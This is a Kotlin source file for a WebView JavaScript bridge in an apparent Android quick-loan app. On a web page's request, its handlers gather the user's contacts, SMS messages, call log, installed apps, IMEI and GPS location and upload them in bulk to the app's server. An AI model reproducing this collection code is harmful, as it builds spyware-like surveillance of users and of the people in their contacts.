package com.vaynhanh.vaynhanh.parts

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.databinding.DataBindingUtil
import android.graphics.Bitmap
import android.media.Image
import android.os.Build
import android.support.annotation.RequiresApi
import android.support.v4.app.ActivityCompat
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.webkit.WebView
import club.rosaemperor.myeyesopen.http.HttpService
import club.rosaemperor.myeyesopen.http.RetrofitUtil
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.vaynhanh.vaynhanh.app.VayNhanhApplication
import com.vaynhanh.vaynhanh.databinding.ActivityMainBinding
import com.vaynhanh.vaynhanh.http.beans.*
import com.vaynhanh.vaynhanh.utils.*
import com.vaynhanh.vaynhanh.utils.SharePrefenceHelper.Companion.mContext
import org.json.JSONObject
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.ByteArrayOutputStream
import java.util.*
import kotlin.collections.ArrayList

class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? = null) : WVJBWebViewClient(webView,messageHandler) {
    var thread : Thread ?= null
    var gson:Gson = Gson()
    var imageGetMobile :String=""
    var imageType = ""
    var CAMERA_REQUEST_CODE=1110
    val DATA_PERMISSIONS = 1111
    var cameraList = ArrayList<String>()
    var ACTIVITYFOROMCLIENT = 10010
    var httpHelper : HttpService = RetrofitUtil.instance.help
    constructor(webView: WebView) : this(webView ,object :WVJBHandler{
        override fun request(data: Any?, callback: WVJBResponseCallback?) {
            callback!!.callback("Response for message from ObjC!")
        }
    })
    init {
        registerHandler("UploadUserContact",object: WVJBHandler{

            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                var jsonObject = data as JSONObject
                SharePrefenceHelper.save("Token",""+jsonObject.get("token"))
                if(Build.VERSION.SDK_INT < Build.VERSION_CODES.M){
                    upLoadData()
                }else{
                    if (ActivityCompat.checkSelfPermission(
                                    webView.context, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
                            ActivityCompat.checkSelfPermission(webView.context,Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                            ActivityCompat.checkSelfPermission(webView.context,  Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                            ActivityCompat.checkSelfPermission(webView.context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        upLoadData()

                    }else{
                        cameraList.clear()
                        cameraList.add(android.Manifest.permission.READ_CONTACTS)
                        cameraList.add(Manifest.permission.READ_CALL_LOG)
                        cameraList.add(Manifest.permission.READ_SMS)
                        cameraList.add(Manifest.permission.READ_PHONE_STATE)
                        (webView.context as Activity).requestPermissions(cameraList.toTypedArray(),DATA_PERMISSIONS)
                    }
                }


            }
        })


        registerHandler("getVersion", object : WVJBHandler {
            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                try {
                    val packageInfo = webView.context.packageManager.getPackageInfo(webView.context.packageName, 0)
                    val jsonObject = JSONObject()
                    jsonObject.put("versionName", packageInfo.versionName)
                    if (Build.VERSION.SDK_INT<= 27) jsonObject.put("versionCode", packageInfo.versionCode)
                    if (Build.VERSION.SDK_INT>= 28) jsonObject.put("versionCode", packageInfo.longVersionCode)
                    jsonObject.put("buildCode", VayNhanhApplication.buildCode)
                    callback!!.callback(jsonObject.toString())
                } catch (e: Exception) {
                    Log.e("error", e.message)
                }
            }




        })
        registerHandler("postImg",object : WVJBHandler{
            @RequiresApi(Build.VERSION_CODES.M)
            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                var jsonObject : JSONObject = data as JSONObject
                 imageType = jsonObject.getString("num")
                imageGetMobile = jsonObject.getString("mobile")
                if (ActivityCompat.checkSelfPermission(
                                webView.context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(webView.context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                   takePhoto()
                }else{
                    cameraList.add( android.Manifest.permission.READ_EXTERNAL_STORAGE)
                    cameraList.add(Manifest.permission.CAMERA)
                    (webView.context as Activity).requestPermissions(cameraList.toTypedArray(),CAMERA_REQUEST_CODE)
                }

            }
        })
        registerHandler("postDeviceInfo", object : WVJBHandler{
            override fun request(data: Any?, callback: WVJBResponseCallback?) {
                val jsonObject = JSONObject()
                if (ActivityCompat.checkSelfPermission(webView.context, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    var tm = webView.context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

                    var deviceID = if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O_MR1) {
                        tm.deviceId
                    } else {
                        tm.imei
                    }
                    var deviceVersion = Build.MODEL
                    var systemVersion = Build.VERSION.RELEASE
                    var deviceName = Build.HOST
                    jsonObject.put("deviceOwner", deviceName)
                    jsonObject.put("deviceBrand", deviceVersion)
                    jsonObject.put("deviceImei", deviceID)
                    jsonObject.put("osVer", systemVersion)
                    var s = ChannelModule(webView.context).channel
                    val ss = s.split(":".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()
                    if (ss.size == 2)
                        s = ss[1]
                    jsonObject.put("channelCode", s)

                    val location = GetGeoUtil(webView.context as Activity).geo
                    if (location != null) {
                        jsonObject.put("geoLon", location.longitude)
                        jsonObject.put("geoLat", location.latitude)
                    }

                    Log.e("devceInfo", jsonObject.toString())

                    callback!!.callback(jsonObject.toString())
                }
            }
        })

    }

    override fun onPageFinished(view: WebView, url: String) {
        super.onPageFinished(view, url)
        var  binding = DataBindingUtil.findBinding<ActivityMainBinding>(view)
        if(binding!!.swipeLayout.isRefreshing) binding.swipeLayout.isRefreshing = false
        SplashScreen.hide(view.context as Activity?)
    }

    fun onActivityResult(intent : Intent){
        Log.d("TAG",""+(intent.extras.get("data") as Bitmap).byteCount )

        var resultImage = intent.extras.get("data") as Bitmap
        val baos = ByteArrayOutputStream()
        resultImage.compress(Bitmap.CompressFormat.PNG, 100, baos)
        var imageString = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
        upImageWithNoOCR(imageString)

    }

    private fun upImage(imageType: String, imageString: String?) {
        when (imageType) {
            IMAGE_TYPE_OCR_FRONT -> upLoadIDCard(imageString, 1)
            IMAGE_TYPE_OCR_BACK -> upLoadIDCard(imageString, 2)
            IMAGE_TYPE_LIVENESS -> upLoadIDCard(imageString, 3)
        }
    }
    fun upImageWithNoOCR(imageString: String?){
        if (imageString != null) {
            var callBackBean  = ImageCallBackBean()
            callBackBean.status ="success"
            callBackBean.message = "暂时没有使用OCR"
            callBackBean.data= imageString
            callBackBean.decodeData = "没有使用OCR"
            callHandler("getImg",gson.toJson(callBackBean))
        }
    }

    /**
     *
     * ocr识别预留方法
     */
    private fun upLoadIDCard(imageString: String?, ocr_mode: Int) {
        var imageJson = ImageJson()
        var userInfo = JSONObject()
        userInfo.put("image_content",imageString)
        var options = JSONObject()
        options.put("ocr_type", 1)
        options.put("auto_rotate", true)
        options.put("ocr_mode", ocr_mode)
        imageJson.options = options.toString()
        imageJson.user_info = userInfo.toString()
        var call=httpHelper.upLoadFaceImage(imageJson)
        call.enqueue(object : Callback<Any>{
            override fun onFailure(call: Call<Any>, t: Throwable) {
                Log.d("TAG","onFailure")
            }

            override fun onResponse(call: Call<Any>, response: Response<Any>) {
                Log.d("TAG","onResponse"+response.body().toString()+response.errorBody())
            }
        })

    }

    fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        when(requestCode){
            CAMERA_REQUEST_CODE ->{
                if (grantResults[0]==0 && grantResults[1] ==0 ){
                    takePhoto()
                }
            }
        }

    }

    private fun takePhoto() {
        val intent = Intent("android.media.action.IMAGE_CAPTURE")
        (webView.context as Activity).startActivityForResult(intent, ACTIVITYFOROMCLIENT)
    }

    val IMAGE_TYPE_OCR_FRONT = "one"
    val IMAGE_TYPE_OCR_BACK = "OCR_BACK"
    val IMAGE_TYPE_LIVENESS = "LIVENESS"
    fun upLoadData(){
        thread = Thread(Runnable {
            var userMessages = UserMessages()
            //应用信息列表
            val applicationUtil = GetApplicationUtil()
            val appList = applicationUtil.getApplications(webView.context.packageManager)
            userMessages.appList = appList

            //通话记录列表
            GetCallRecordUtil.init(webView.context as Activity)
            val callRecords = GetCallRecordUtil.getCallRecordList(webView.context.contentResolver)
            userMessages.callRecords = callRecords

            //联系人列表

            val contactsUtil = GetContactsUtil(webView.context)
            userMessages.contactList = contactsUtil.contacts

            //短信记录列表

            val smsRecordUtil = GetSmsRecordUtil(webView.context)
            userMessages.smsRecords = smsRecordUtil.smsInPhone
            //设备信息
            val device = DeviceModule(webView.context).deviceInfo
            userMessages.device = gson.fromJson<DeviceMessage>(device, DeviceMessage::class.java)
            var call = httpHelper.upLoadUserMessage(userMessages)
            call.enqueue(object : Callback<Any>{
                override fun onFailure(call: Call<Any>?, t: Throwable?) {

                }

                override fun onResponse(call: Call<Any>?, response: Response<Any>?) {
                }
            })
        })
        thread!!.start()
    }
}